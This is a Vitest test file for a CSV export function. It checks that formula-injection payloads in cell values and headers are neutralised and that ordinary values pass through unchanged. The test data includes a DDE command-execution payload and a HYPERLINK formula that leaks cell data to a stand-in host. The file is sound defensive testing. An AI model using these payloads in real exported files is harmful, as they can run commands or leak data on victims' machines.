import { describe, expect, it } from 'vitest';
import { toCsv } from '@/lib/csv';

/** The single data row produced for a single-column header. */
const cell = (value: string | number | boolean | null) => toCsv(['Name'], [[value]]).split('\n')[1];

describe('toCsv — CSV formula injection', () => {
  // Without neutralising these, a user-supplied dataset name or activity title becomes a live
  // formula on the machine of whoever opens the exported file in Excel/LibreOffice/Sheets.
  it.each([
    ['an equals-prefixed formula', '=1+1'],
    ['a DDE payload', "=cmd|'/c calc'!A1"],
    ['a HYPERLINK exfiltration attempt', '=HYPERLINK("https://evil.test?leak="&A1,"click")'],
    ['a plus-prefixed formula', '+1+1'],
    ['an at-prefixed payload', '@SUM(1+1)'],
    ['a leading tab before a formula', '\t=1+1'],
    ['a leading carriage return', '\r=1+1'],
  ])('neutralises %s', (_label, payload) => {
    // The exported cell is always quoted and always starts with the literal-text marker, so no
    // spreadsheet can begin evaluating it as a formula. Apostrophes inside the value are doubled
    // and double quotes are doubled for CSV syntax.
    const expected = `"'${payload.replace(/'/g, "''").replace(/"/g, '""')}"`;
    expect(cell(payload)).toBe(expected);
    expect(cell(payload).startsWith('"\'')).toBe(true);
  });

  it('doubles apostrophes already inside a neutralised value, so the quoting stays valid', () => {
    expect(cell("=1+1 OR 'x'")).toBe('"\'=1+1 OR \'\'x\'\'"');
  });

  it('quotes a neutralised value that also contains a comma', () => {
    expect(cell('=1,2')).toBe('"\'=1,2"');
  });

  it('escapes double quotes inside a neutralised value', () => {
    expect(cell('="1+1"')).toBe('"\'=""1+1"""');
  });

  // Regression guard. The fix must not wrap ordinary content in quotes, and must not convert
  // real numbers into text — a negative number evaluates as a number, never as a formula.
  it.each([
    ['plain text', 'Revenue Forecast', 'Revenue Forecast'],
    ['a comma', 'Finance, Supply Chain', '"Finance, Supply Chain"'],
    ['a double quote', 'He said "hi"', '"He said ""hi"""'],
    ['a negative number', -42.5, '-42.5'],
    ['a positive number', 1204, '1204'],
    ['a boolean', true, 'true'],
    ['text starting with a digit', '2026 revenue', '2026 revenue'],
    ['text that already starts with an apostrophe', "'quoted'", "'quoted'"],
    ['a dash inside text', 'Cost - Total', 'Cost - Total'],
    ['a dash-prefixed string, which IS neutralised unlike a number', '-1+1', '"\'-1+1"'],
  ])('leaves %s alone', (_label, value, expected) => {
    expect(cell(value)).toBe(expected);
  });

  it('preserves an embedded newline inside a quoted cell', () => {
    // Asserted whole: splitting on newlines cannot work for a value that contains one.
    expect(toCsv(['Name'], [['line one\nline two']])).toBe('Name\n"line one\nline two"');
  });

  it('applies the same escaping to header cells', () => {
    expect(toCsv(['=cmd'], [])).toBe('"\'=cmd"');
  });

  it('renders null and undefined as empty cells, not as the text "null"', () => {
    expect(toCsv(['A', 'B'], [[null, undefined]])).toBe('A,B\n,');
  });

  it('keeps the header row first and preserves row order', () => {
    expect(toCsv(['Name', 'Status'], [['Alpha', 'Active'], ['Beta', 'Draft']])).toBe(
      'Name,Status\nAlpha,Active\nBeta,Draft',
    );
  });
});
